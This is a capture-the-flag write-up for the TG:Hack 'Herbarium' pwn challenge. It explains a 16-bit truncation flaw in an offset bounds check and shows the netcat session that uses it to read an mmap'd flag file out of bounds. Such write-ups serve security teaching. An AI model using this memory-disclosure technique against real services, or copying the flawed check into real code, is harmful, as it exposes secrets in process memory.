# The Biohacker's Herbarium Service writeup
**Author: PewZ**

**Difficulty: easy**

**Category: pwn**

---

We are given a binary and no source code. Let's run the binary and perfom some
reverse engineering to figure out what the program does.

When we run it we are presented with the following menu:

```console
Welcome to the TG:Hack herbarium!
The place where you can store all your plant specimens
1. add plant specimen
2. read plant data
3. read plant data at offset
4. remove plant specimen
5. exit
>
```

Some basic testing reveals that there are no obvious use-after-free bugs etc.
We can add plant specimens up to 1000000 bytes in size, and read them back. We can also
delete plants, but they are safely set to NULL afterwards, so there's no way to
perform a double free.

When reading a plant using an offset, we have a weird bounds check. See the
following semi cleaned up code from IDA:
```C
  v0 = get_plant();
  v3 = (struct plant *)v0;
  if ( v0 )
  {
    printf("offset: ");
    v1 = get_num();
    if ( (unsigned __int16)v1 <= (unsigned int)v3->max_off )
      LODWORD(v0) = puts(&v3->buf[v1]);
    else
      LODWORD(v0) = puts("invalid offset!");
  }
  return (int)v0;
```

Note that our input (`v1`) gets truncated when it's casted to a 16-bit int. If
our specified offset is larger than the maximum size for a `uint16_t`, the check
will succeed!

This means that we can read data out of bounds, but what can we do with that?
Notice that the flag is read in at the start of main in the `read_flag()`
function. The flag is mapped into memory using `mmap()`. When requesting large
allocation sizes to malloc, it will fall back to using `mmap()` if the size is
too large to be handled by normal allocations. We can abuse the fact that
regions mapped using `mmap()` will be located at predictable offsets from each
other to read the flag out of bounds from an `mmap`ed chunk returned from
malloc.

The offset can be calculated by running the program in a Ubuntu bionic docker
container and checking the address of the two mapped regions.
Here's an example from `/proc/<PID>/maps`:

```
564e001ff000-564e00201000 r-xp 00000000 fd:01 15476957                   /home/tghack/chall
564e00400000-564e00401000 r--p 00001000 fd:01 15476957                   /home/tghack/chall
564e00401000-564e00402000 rw-p 00002000 fd:01 15476957                   /home/tghack/chall
564e008c5000-564e008e6000 rw-p 00000000 00:00 0                          [heap]
7f0d52c6d000-7f0d52e54000 r-xp 00000000 fd:01 14953453                   /lib/x86_64-linux-gnu/libc-2.27.so
7f0d52e54000-7f0d53054000 ---p 001e7000 fd:01 14953453                   /lib/x86_64-linux-gnu/libc-2.27.so
7f0d53054000-7f0d53058000 r--p 001e7000 fd:01 14953453                   /lib/x86_64-linux-gnu/libc-2.27.so
7f0d53058000-7f0d5305a000 rw-p 001eb000 fd:01 14953453                   /lib/x86_64-linux-gnu/libc-2.27.so
7f0d5305a000-7f0d5305e000 rw-p 00000000 00:00 0
7f0d5305e000-7f0d53085000 r-xp 00000000 fd:01 14953435                   /lib/x86_64-linux-gnu/ld-2.27.so
7f0d5318c000-7f0d53283000 rw-p 00000000 00:00 0
7f0d53284000-7f0d53285000 r--p 00000000 fd:01 15476958                   /home/tghack/flag.txt
7f0d53285000-7f0d53286000 r--p 00027000 fd:01 14953435                   /lib/x86_64-linux-gnu/ld-2.27.so
7f0d53286000-7f0d53287000 rw-p 00028000 fd:01 14953435                   /lib/x86_64-linux-gnu/ld-2.27.so
7f0d53287000-7f0d53288000 rw-p 00000000 00:00 0
7ffdcd3e5000-7ffdcd406000 rw-p 00000000 00:00 0                          [stack]
7ffdcd428000-7ffdcd42b000 r--p 00000000 00:00 0                          [vvar]
7ffdcd42b000-7ffdcd42d000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
```
The allocated plant specimen is located at address `0x7f0d5318c010` (can be found be
attaching gdb and looking at the return value from `malloc()`), and the flag is
located at `0x7f0d53284000`. Now we can calculate the offset:
`0x7f0d53284000 - 0x7f0d5318c010 = 0xf7ff0`.

The solution is then:
1. add plant specimen with large size, so it is allocated using mmap
2. read plant data at offset 0xf7ff0

```console
$ nc plants.tghack.no 6004
1. add plant specimen
2. read plant data
3. read plant data at offset
4. remove plant specimen
5. exit
> 1
size: 1000000
data: AAAAAAAA
1. add plant specimen
2. read plant data
3. read plant data at offset
4. remove plant specimen
5. exit
> 3
index: 0
offset: 1015792
TG20{arent_you_tired_of_these_note_taking_services_yet?_e650f8d4343a4278d3450e0a1d737e54}
```

Note: the offset might vary a bit depending on how you run the binary. You could
also bruteforce the offset at `0x1000 - 0x10` intervals. The bruteforce should
take around 2 minutes.
